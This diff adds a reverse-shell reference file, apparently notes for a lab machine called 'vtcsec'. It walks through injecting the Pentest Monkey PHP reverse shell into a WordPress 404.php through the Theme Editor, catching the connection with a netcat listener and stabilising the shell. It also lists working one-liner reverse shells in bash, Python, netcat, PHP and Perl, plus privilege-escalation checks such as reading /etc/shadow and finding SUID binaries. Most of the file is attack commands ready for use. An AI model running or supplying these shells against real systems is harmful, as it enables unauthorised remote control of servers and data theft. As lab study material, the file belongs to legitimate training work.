@@ -1,0 +1,439 @@
+================================================================================
+                    REVERSE SHELLS — FULL REFERENCE & EXPLANATION
+================================================================================
+OVERVIEW
+--------
+A reverse shell is a technique where you force the TARGET machine to connect
+back to YOUR machine (Kali), giving you a command line on the target.
+
+This is the opposite of a normal connection where YOU connect TO the target.
+
+WHY REVERSE AND NOT NORMAL?
+----------------------------
+A normal (bind) shell means you connect to the target on a port. The problem
+is firewalls almost always block incoming connections on random ports. The
+target machine's firewall would block you from connecting in.
+
+A reverse shell works the other way around — the TARGET reaches out TO YOU.
+Firewalls almost never block outgoing connections because the machine needs
+to browse the internet. So the shell rides out through the firewall like
+normal traffic and lands on your Kali listener.
+
+FLOW — How a reverse shell works
+----------------------------------
+
+  YOUR KALI MACHINE                    TARGET MACHINE (victim)
+  -----------------                    -----------------------
+  Step 1: Start a listener             Step 3: Shell code executes
+  nc -lvnp 4444                        (triggered by you visiting a page,
+  "waiting for connection..."           uploading a file, exploiting a bug)
+
+                                        Step 4: Target connects BACK to Kali
+            <-------CONNECTION---------  on port 4444
+
+  Step 5: You receive the shell
+  You are now running commands
+  on the target machine
+
+The key insight: YOU never connect to the target for the shell.
+The TARGET connects to YOU. That is what makes it a reverse shell.
+
+================================================================================
+                    STEP 0 — FIND YOUR KALI IP ADDRESS
+================================================================================
+WHAT IS IT AND WHY DO YOU NEED IT
+-----------------------------------
+Your Kali IP address is the address the TARGET machine will call back to.
+When you set up the reverse shell code, you tell it "connect back to THIS IP".
+If you put the wrong IP in, the shell will call somewhere else and you will
+never receive the connection.
+
+You need to find this BEFORE editing any shell files.
+
+COMMAND
+--------
+  ip a
+
+  What it does:
+  Shows all network interfaces and their IP addresses on your Kali machine.
+  You will see output like this:
+
+  1: lo: <LOOPBACK>
+      inet 127.0.0.1/8          <- this is loopback, ignore it
+
+  2: eth0: <BROADCAST>
+      inet 10.0.2.15/24         <- THIS is your IP, write this down
+
+  The interface is usually eth0 for wired or wlan0 for wireless.
+  The number after inet is your IP. In this example it is 10.0.2.15.
+  Ignore the /24 part — that is the subnet mask, not part of your IP.
+
+  Write your IP down. You will need to paste it into your shell file.
+
+  Alternative command:
+  ifconfig eth0 | grep inet      Shows just the IP for eth0
+
+================================================================================
+                    STEP 1 — SET UP THE PHP REVERSE SHELL FILE
+================================================================================
+WHAT IS A PHP REVERSE SHELL
+-----------------------------
+Kali Linux comes with pre-built reverse shell scripts in multiple languages.
+The PHP reverse shell is a PHP script that, when executed by a web server,
+makes the server connect back to your Kali machine and hand you a terminal.
+
+The file lives at:  /usr/share/webshells/php/php-reverse-shell.php
+
+It was written by pentester Pentest Monkey and is the most commonly used
+web reverse shell. Out of the box it is configured to connect to localhost
+on port 1234 — you need to change both of these to your own values.
+
+COMMAND — Copy the shell to your home directory
+------------------------------------------------
+  cp /usr/share/webshells/php/php-reverse-shell.php ~/shell.php
+
+  cp                                        Copy command
+  /usr/share/webshells/php/php-reverse-shell.php    Source file (original)
+  ~/shell.php                               Destination (your home directory)
+
+  Why copy it instead of editing the original?
+  You always want to keep the original untouched. If you make a mistake
+  you can just copy it again. Also the original is in a read-only location.
+  ~/shell.php saves it to /home/kali/shell.php which you own and can edit.
+
+COMMAND — Open and edit the shell file
+----------------------------------------
+  nano ~/shell.php
+
+  What it does:
+  Opens the file in nano text editor. You need to scroll down through the
+  file to find the two lines that need changing. They look like this:
+
+  $ip = '127.0.0.1';    <- This says connect back to localhost (wrong)
+  $port = 1234;         <- This is the port to connect back on
+
+  127.0.0.1 is the loopback address — it means "this machine itself".
+  If you leave it as 127.0.0.1, the TARGET will try to connect to itself
+  instead of connecting to your Kali machine. You will never get a shell.
+
+  Change them to:
+  $ip = '10.0.2.15';    <- YOUR Kali IP from ip a
+  $port = 4444;         <- Port your Netcat listener will use (you choose this)
+
+  The port number is your choice — just make sure the port you put here
+  EXACTLY matches the port you use in your nc -lvnp command later.
+  4444 is the most commonly used port for this purpose.
+
+  Save the file:
+  Ctrl+X    Begin exit
+  Y         Confirm save
+  Enter     Confirm filename
+
+COMMAND — Verify your changes were saved correctly
+----------------------------------------------------
+  grep "ip\|port" ~/shell.php
+
+  What it does:
+  Searches the file for lines containing "ip" or "port" so you can
+  quickly confirm your IP and port are correct without opening the file.
+
+================================================================================
+                    STEP 2 — START YOUR NETCAT LISTENER
+================================================================================
+WHAT IS NETCAT AND WHAT IS A LISTENER
+---------------------------------------
+Netcat (nc) is a networking tool that can open raw TCP connections.
+In this context you use it in LISTEN mode — it sits on a port and waits.
+
+When the target machine executes your reverse shell and calls back to your
+Kali IP on port 4444, Netcat catches that connection and hands you the
+interactive shell. Without the listener running, the shell has nowhere to
+land and the connection is refused.
+
+CRITICAL: Start this BEFORE triggering the shell. The target calls back
+the moment the shell executes. If your listener is not ready yet, the
+connection attempt fails and you get nothing.
+
+COMMAND — Start the listener
+------------------------------
+  nc -lvnp 4444
+
+  nc        Netcat
+  -l        Listen mode — wait for an incoming connection instead of connecting out
+  -v        Verbose — print details when a connection is made
+  -n        No DNS resolution — use raw IPs, skip hostname lookups (faster)
+  -p 4444   Listen on port 4444 — must match the port in your shell.php file
+
+  What you see while waiting:
+  listening on [any] 4444 ...
+
+  What you see when the shell connects:
+  connect to [10.0.2.15] from (UNKNOWN) [10.0.2.8] 54321
+  Linux vtcsec 4.4.0-21-generic #37-Ubuntu
+  $
+
+  That $ prompt means you have a shell on the target. You are now running
+  commands on 10.0.2.8 from your Kali terminal.
+
+IMPORTANT: Leave this terminal window open and do not type anything in it
+until the shell connects. Open a separate terminal for all other work.
+
+================================================================================
+                    STEP 3 — INJECT THE SHELL INTO WORDPRESS
+================================================================================
+OVERVIEW
+---------
+WordPress has a built-in PHP file editor in the admin panel called the
+Theme Editor. It lets admins edit PHP theme files directly in the browser.
+This is intended for customization but is a massive security risk because
+anyone with admin access can use it to run arbitrary PHP code — including
+a reverse shell.
+
+You are going to replace the contents of 404.php with your shell code.
+404.php is the template WordPress uses when someone visits a page that
+does not exist. You will trigger it by visiting a fake URL.
+
+COMMAND — Print your shell file so you can copy it
+----------------------------------------------------
+  cat ~/shell.php
+
+  What it does:
+  Prints the entire contents of your shell file to the terminal.
+  Select all of the output and copy it to your clipboard.
+  You will paste this into the WordPress theme editor.
+
+STEPS IN WORDPRESS
+-------------------
+  1. Open Firefox and go to:   http://vtcsec/secret/wp-login.php
+  2. Log in with the credentials found by WPScan
+
+  3. In the admin dashboard go to:
+     Appearance (left sidebar) -> Theme Editor
+
+  4. On the RIGHT side of the Theme Editor you will see a list of
+     PHP files. Look for and click:   404.php
+     (it may also be called 404 Template)
+
+  5. You will see the existing PHP code for the 404 page in the editor.
+     Click inside the editor, press Ctrl+A to select ALL of it, then
+     delete it. The editor should now be completely empty.
+
+  6. Paste your entire shell.php contents into the empty editor.
+     The editor should now contain only your PHP reverse shell code.
+
+  7. Click the button:   Update File
+
+  If you see "File edited successfully" — your shell is now live on
+  the server. The next person (or you) to visit a missing page will
+  trigger it.
+
+================================================================================
+                    STEP 4 — TRIGGER THE REVERSE SHELL
+================================================================================
+OVERVIEW
+---------
+Your shell is sitting inside 404.php waiting to execute. WordPress runs
+404.php whenever someone requests a page that does not exist. You just
+need to visit any URL on the site that has no real page.
+
+The moment WordPress loads 404.php, your shell code runs, the server
+connects back to your Kali listener, and you get a shell.
+
+MAKE SURE your nc -lvnp 4444 listener is still running before doing this.
+
+IN FIREFOX — Visit a fake page
+--------------------------------
+  http://vtcsec/secret/thispageisntreal
+  http://vtcsec/secret/aaaa
+  http://vtcsec/secret/?p=99999
+
+  Any of these will work. WordPress will try to find the page, fail,
+  and load 404.php — which is now your reverse shell.
+
+  The browser will appear to hang or load forever. That is normal.
+  The shell is running, keeping the connection open. The browser is
+  just waiting for a response that will never come.
+
+WHAT TO LOOK FOR in your Netcat terminal
+-----------------------------------------
+  connect to [10.0.2.15] from (UNKNOWN) [10.0.2.8] 43210
+  Linux vtcsec 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:32:39 UTC 2016
+  12:34:56 up 1 hour,  1 user,  load average: 0.00, 0.00, 0.00
+  USER     TTY      FROM             LOGIN@   IDLE JCPU   PCPU WHAT
+  www-data pts/0    10.0.2.15        12:00    0.00s 0.00s 0.00s sh
+  $
+
+  That $ is a shell running on the TARGET machine as www-data (the web
+  server user). You are in.
+
+  Try it immediately:
+  whoami             Shows what user you are on the target
+  id                 Shows your user ID and group memberships
+  pwd                Shows what directory you are in
+  ls                 List files in current directory
+  uname -a           Show the target OS and kernel version
+
+================================================================================
+                    STEP 5 — STABILISE THE SHELL
+================================================================================
+WHAT IS SHELL STABILISATION AND WHY DO YOU NEED IT
+----------------------------------------------------
+The raw Netcat shell you receive is very basic and unstable:
+  - Pressing Ctrl+C kills the entire shell instead of cancelling a command
+  - Tab completion does not work
+  - Arrow keys print garbage characters instead of scrolling history
+  - Programs like nano and vim do not display correctly
+  - The shell can randomly die if you mistype something
+
+Stabilising the shell upgrades it to a proper interactive terminal.
+
+METHOD 1 — Python PTY (most common, works on most Linux targets)
+-----------------------------------------------------------------
+  Run these commands in your Netcat shell after connecting:
+
+  python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+  python3 -c         Run a Python3 command inline
+  import pty         Import Python's pseudo-terminal module
+  pty.spawn("/bin/bash")   Spawn a proper bash shell with a PTY
+
+  Then press:   Ctrl+Z      (sends the shell to background on Kali)
+
+  Back on your Kali terminal run:
+  stty raw -echo
+  fg
+
+  stty raw -echo    Configures your terminal to pass keystrokes raw
+  fg                Brings the shell back to foreground
+
+  Then in the shell type:
+  export TERM=xterm
+
+  You now have a fully interactive shell with tab completion, arrow keys,
+  and Ctrl+C works properly.
+
+  If python3 is not available, try:
+  python -c 'import pty; pty.spawn("/bin/bash")'
+  or
+  /usr/bin/script -qc /bin/bash /dev/null
+
+METHOD 2 — rlwrap (simpler, good for quick use)
+------------------------------------------------
+  Instead of plain nc, start your listener with rlwrap:
+  rlwrap nc -lvnp 4444
+
+  rlwrap wraps the shell with readline — gives you arrow key history
+  and basic editing. Not as full-featured as Method 1 but much easier.
+
+================================================================================
+                    OTHER WAYS TO GET A REVERSE SHELL
+================================================================================
+OVERVIEW
+---------
+PHP webshell injection via WordPress is just one method. Any time you can
+get a target machine to execute code, you can get a reverse shell. Below
+are the most common one-liner reverse shells for different languages.
+
+Always start nc -lvnp 4444 on Kali first before running any of these.
+Replace 10.0.2.15 with your actual Kali IP in every command.
+
+BASH REVERSE SHELL
+------------------
+  bash -i >& /dev/tcp/10.0.2.15/4444 0>&1
+
+  bash -i              Start an interactive bash session
+  >&                   Redirect both stdout and stderr
+  /dev/tcp/10.0.2.15/4444    Open a TCP connection to your Kali on port 4444
+  0>&1                 Also redirect stdin through the same connection
+
+  When to use: When you have command execution on a Linux target
+  (via RCE, command injection, SSH, cron job, etc.)
+
+PYTHON REVERSE SHELL
+--------------------
+  python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.0.2.15",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
+
+  When to use: When Python is available on the target and you can run it
+  (common on Linux servers)
+
+NETCAT REVERSE SHELL (if -e flag is available)
+-----------------------------------------------
+  nc 10.0.2.15 4444 -e /bin/bash
+
+  -e /bin/bash    Execute bash and pipe it through the connection
+  When to use: When Netcat is installed on the target with -e support
+  Note: Many modern nc installations do not include -e
+
+NETCAT WITHOUT -e (MKFIFO METHOD)
+-----------------------------------
+  rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.0.2.15 4444 > /tmp/f
+
+  When to use: When nc is available but -e is not supported
+
+PHP REVERSE SHELL ONE-LINER
+-----------------------------
+  php -r '$sock=fsockopen("10.0.2.15",4444);exec("/bin/bash -i <&3 >&3 2>&3");'
+
+  When to use: Quick PHP shell when you can inject a single line of PHP
+  rather than uploading a full file
+
+PERL REVERSE SHELL
+------------------
+  perl -e 'use Socket;$i="10.0.2.15";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");'
+
+  When to use: When Perl is installed on the target (common on older systems)
+
+================================================================================
+                    UPGRADING AND USING YOUR SHELL
+================================================================================
+
+BASIC COMMANDS ONCE YOU HAVE A SHELL
+--------------------------------------
+  whoami                         What user are you on the target
+  id                             Your user ID and group memberships
+  uname -a                       Target OS, kernel version, architecture
+  hostname                       Target machine name
+  pwd                            Current directory you landed in
+  ls -la                         List all files including hidden
+  cat /etc/passwd                List all users on the system
+  cat /etc/shadow                Password hashes (requires root)
+  find / -perm -4000 2>/dev/null Find SUID files for privilege escalation
+  sudo -l                        Check what sudo commands you can run
+  ps aux                         See all running processes
+  netstat -tulnp                 See all open ports on the target
+
+PRIVILEGE ESCALATION — GOING FROM www-data TO ROOT
+----------------------------------------------------
+  When you first get a shell via WordPress you will be www-data — the
+  web server user. This has limited permissions. Your goal is to become
+  root. This process is called privilege escalation.
+
+  Common quick checks:
+  sudo -l                        Can www-data run anything as sudo?
+  find / -perm -4000 2>/dev/null Any SUID binaries that can be exploited?
+  cat /etc/crontab               Any cron jobs running as root?
+  ls -la /home                   Any other user home directories to explore?
+
+================================================================================
+                    QUICK REFERENCE — REVERSE SHELL CHECKLIST
+================================================================================
+
+  1.   ip a                                      Get your Kali IP
+  2.   cp /usr/share/webshells/php/php-reverse-shell.php ~/shell.php
+  3.   nano ~/shell.php                           Change $ip and $port
+  4.   nc -lvnp 4444                              Start listener (new terminal)
+  5.   Inject shell into target (WordPress, file upload, exploit, etc.)
+  6.   Trigger the shell (visit 404 page, execute command, etc.)
+  7.   Receive connection in Netcat terminal
+  8.   python3 -c 'import pty; pty.spawn("/bin/bash")'   Stabilise shell
+  9.   Ctrl+Z -> stty raw -echo -> fg -> export TERM=xterm
+  10.  whoami / id / uname -a                     Confirm access and enumerate
+
+  REMEMBER:
+  - Start nc listener BEFORE triggering the shell
+  - Your $ip must be YOUR Kali IP, not the target IP
+  - Your $port must match your nc -lvnp port exactly
+  - The browser will hang when the shell fires — that is normal
+  - Open a second terminal for other work, keep nc terminal open
+
+================================================================================
